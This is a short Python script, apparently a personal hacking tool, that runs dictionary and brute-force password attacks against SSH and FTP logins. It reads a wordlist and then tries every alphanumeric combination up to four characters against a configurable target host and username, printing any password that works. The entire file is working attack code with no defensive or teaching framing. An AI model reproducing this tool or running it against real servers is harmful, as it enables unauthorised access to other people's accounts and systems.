import itertools
import time
import paramiko
import ftplib

# Function to measure time taken
def timer(func):
    def wrapper(*args, **kwargs):
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        print(f"Time taken: {end_time - start_time} seconds")
        return result
    return wrapper

# SSH login function
def ssh_login(target, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False

# FTP login function
def ftp_login(target, username, password):
    try:
        ftp = ftplib.FTP(target)
        ftp.login(username, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False

# Dictionary attack function
def dictionary_attack(target, username, password_file, protocol):
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            if protocol == "ssh":
                if ssh_login(target, username, password):
                    print(f"Password found: {password}")
                    return password
            elif protocol == "ftp":
                if ftp_login(target, username, password):
                    print(f"Password found: {password}")
                    return password
    print("Password not found in dictionary.")
    return None

# Brute force attack function
def brute_force_attack(target, username, chars, max_length, protocol):
    for length in range(1, max_length + 1):
        for attempt in itertools.product(chars, repeat=length):
            password = ''.join(attempt)
            if protocol == "ssh":
                if ssh_login(target, username, password):
                    print(f"Password found: {password}")
                    return password
            elif protocol == "ftp":
                if ftp_login(target, username, password):
                    print(f"Password found: {password}")
                    return password
    print("Password not found using brute force.")
    return None

@timer
def main():
    target = "your_target_ip"
    username = "your_username"
    password_file = "C:/Users/5H3PH3RD/Desktop/brute force password cracker/passwords.txt"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    max_length = 4
    protocol = "ssh"  # or "ftp"

    print("Starting dictionary attack...")
    dictionary_attack(target, username, password_file, protocol)
    
    print("Starting brute force attack...")
    brute_force_attack(target, username, chars, max_length, protocol)

if __name__ == "__main__":
    main()
